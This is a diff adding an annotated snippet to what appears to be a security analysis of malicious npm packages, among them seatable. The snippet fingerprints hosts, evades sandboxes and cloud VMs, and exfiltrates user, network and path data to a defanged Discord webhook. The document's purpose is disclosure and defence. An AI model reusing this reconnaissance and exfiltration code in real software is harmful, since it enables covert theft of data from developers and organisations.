@@ -30,6 +30,50 @@ The script performs reconnaissance with the sole purpose of fingerprinting each 
 
 The annotated [code](https://socket.dev/npm/package/seatable/files/11.8.1/package/index.js) snippets below demonstrate the malicious logic inside the [`seatable`](https://socket.dev/npm/package/seatable/overview/11.8.1) package. This payload is identical across all 60 packages published by the threat actor.
 
+```javascript
+const os = require("os");                // Gathers host and user details
+const dns = require("dns");              // Reads system DNS servers
+const https = require("https");
+const packageJSON = require("./package.json");
+const package = packageJSON.name;        // Fingerprints which malicious pkg ran
+
+// ---------- Local network inspection ------------
+function getIPAddress() {                // Enumerates local NICs
+  const networkInterfaces = os.networkInterfaces();
+  ...
+  if (alias.family === 'IPv4' && !alias.internal) {
+      return alias.address;              // Captures internal IP
+  }
+}
+
+// ---------- Public network inspection ------------
+function getExternalIP(cb) {             // Queries ipinfo[.]io for external IP
+  https.get('https://ipinfo.io/json', (res) => { ... });
+}
+
+// ---------- Virtualization / Sandbox evasion ------
+if ( externalHost.includes("compute.amazonaws.com") ||    // AWS
+     externalHost.includes("bc.googleusercontent.com") || // GCP
+     externalHost.includes("default-rdns.vocus.co.nz") || // Sandboxes
+     internalHost.includes("LD.local") ||                 // Lab domain
+     homedir.match(/justin|mal_data|malicious/i) ) {      // Research VMs
+     return;                           // Abort if running in known test envs
+}
+
+// ---------- Exfiltration to a Discord webhook -----
+const trackingData = JSON.stringify({            // Builds large JSON blob:
+     package, directory: __dirname, home_directory: os.homedir(),
+     username: os.userInfo().username, dns: dns.getServers(),
+     internal_hostname: os.hostname(), internal_ip: getIPAddress(),
+     external_ip: ext.ip, external_hostname: ext.hostname, organization: ext.org,
+     resolved_url: packageJSON.___resolved, package_version: packageJSON.version,
+     package_json: packageJSON, package_type: 'npm'
+});
+
+const webhookURL = "hxxps://discord[.]com/api/webhooks/1330015051482005555/5fll497pcjzKBiY3b_oa9YRh-r5Lr69vRyqccawXuWE_horIlhwOYzp23JWm-iSXuPfQ";
+https.request(webhookURL, {...}).write(JSON.stringify({content:`\`\`\`json\n${trackingData}\n\`\`\``}));
+```
+
 The script gathers enough information to connect an organization's internal network to its outward‑facing presence. By harvesting internal and external IP addresses, DNS servers, usernames, and project paths, it enables a threat actor to chart the network and identify high‑value targets for future campaigns.
 
 On continuous‑integration servers, the leak can reveal internal package registry URLs and build paths, intelligence that speeds up subsequent supply chain attacks. While the current payload is limited to reconnaissance, it creates a strategic risk by laying the foundation for deeper intrusions.
